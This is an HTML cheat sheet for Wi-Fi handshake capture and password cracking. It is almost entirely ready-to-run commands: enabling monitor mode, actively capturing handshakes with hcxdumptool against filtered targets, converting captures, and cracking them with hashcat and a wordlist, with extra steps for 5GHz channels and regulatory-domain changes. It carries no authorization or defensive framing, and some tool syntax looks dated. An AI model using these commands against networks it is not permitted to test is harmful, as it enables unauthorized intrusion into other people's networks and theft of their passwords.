<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Handshake Capture & Crack Cheatsheet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        code {
            background-color: #f4f4f4;
            padding: 5px;
        }
    </style>
</head>
<body>

<h1>Wi-Fi Handshake Capture & Crack Cheatsheet 📡</h1>

<h2>Table of Contents 📋</h2>
<ul>
    <li><a href="#preliminary">Preliminary Commands & Information Retrieval</a></li>
    <li><a href="#capture">Capture & Conversion Phase</a></li>
    <li><a href="#additional">Additional Scans & Information</a></li>
    <li><a href="#cracking">Cracking Phase</a></li>
    <li><a href="#5ghz">5GHz Network Capturing Cheat Sheet</a></li>
</ul>

<h2 id="preliminary">Preliminary Commands & Information Retrieval 🛠</h2>
<ul>
    <li><strong>Secure Copy from Remote Device</strong></li>
    <code>scp -r root@172.16.42.1:/root/example.pcapng /home/username/Desktop</code>
    <p>📖 Downloads files from remote devices using SCP.</p>
    <!-- ... -->
    <li><strong>Check Wireless Interfaces</strong></li>
    <code>iwconfig</code>
    <p>📖 Displays wireless network interface details.</p>
    <!-- ... -->
    <li><strong>Kill Interfering Services</strong></li>
    <code>airmon-ng check kill</code>
    <p>📖 Stops services that might interfere with wireless tools.</p>
</ul>

<h2 id="capture">Capture & Conversion Phase 🎯</h2>
<ul>
    <li><strong>Set Wireless Card to Monitor Mode</strong></li>
    <code>sudo ip link set wlan0 down</code>
    <code>sudo iw wlan0 set monitor control</code>
    <code>sudo ip link set wlan0 up</code>
    <!-- ... -->
    <p>📖 Prepares the wireless card for capture.</p>
    <!-- ... -->
    <!-- ... -->
    <li><strong>Capture Handshakes with hcxdumptool</strong></li>
    <code>hcxdumptool -i wlan1 -o dumpfile.pcapng --active_beacon --enable_status=15</code>
    <!-- ... -->
    <p>📖 Captures packets from networks.</p>
    <!-- ... -->
    <li><strong>Convert Captured File for Hashcat</strong></li>
    <code>hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng</code>
    <p>📖 Converts packets for password cracking.</p>
</ul>

<h2 id="additional">Additional Scans & Information 📡</h2>
<ul>
    <li><strong>Scan for Nearby Networks</strong></li>
    <code>hcxdumptool --do_rcascan -i wlan1</code>
    <p>📖 Scans and displays nearby networks.</p>
</ul>

<h2 id="cracking">Cracking Phase 🔐</h2>
<ul>
    <li><strong>Crack with Hashcat</strong></li>
    <code>hashcat -m 22000 hash.hc22000 wordlist.txt</code>
    <p>📖 Uses hashcat to attempt password cracks.</p>
</ul>

<h2 id="5ghz">5GHz Network Capturing Cheat Sheet 📶</h2>
<ul>
    <li><strong>1. Install Necessary Tools</strong></li>
    <code>sudo apt-get install hcxdumptool hcxtools</code>

    <li><strong>2. Check for 5GHz Support</strong></li>
    <code>iw list</code>

    <li><strong>3. Enable Monitor Mode</strong></li>
    <code>sudo ip link set wlan0 down</code>
    <code>sudo iw dev wlan0 set type monitor</code>
    <code>sudo ip link set wlan0 up</code>

    <li><strong>4. Set to 5GHz Channel</strong></li>
    <code>sudo iw dev wlan0 set channel 36</code>

    <li><strong>5. Identify Target Networks</strong></li>
    <code>sudo hcxdumptool -i wlan0 --scan</code>

    <li><strong>6. Capture Traffic</strong></li>
    <code>sudo hcxdumptool -i wlan0 --enable_status=1 -o output.pcapng --filterlist=filterlist.txt --filtermode=2</code>

    <li><strong>7. Analyze Captured Traffic</strong></li>
    <code>hcxpcaptool -z output.hccapx output.pcapng</code>

    <li><strong>8. Troubleshooting</strong></li>
    <code>sudo iw reg get</code>
    <code>sudo iw reg set US</code>

    <li><strong>9. Switch Back to 2.4GHz</strong></li>
    <code>sudo ip link set wlan0 down</code>
    <code>sudo iw dev wlan0 set type monitor</code>
    <code>sudo iw dev wlan0 set channel 6</code>
    <code>sudo ip link set wlan0 up</code>

    <li><strong>10. List 2.4GHz Channels</strong></li>
    <code>iw phy phy0 channels</code>
    <code>iwlist wlan0 channel</code>
</ul>
</ul>

</body>
</html>
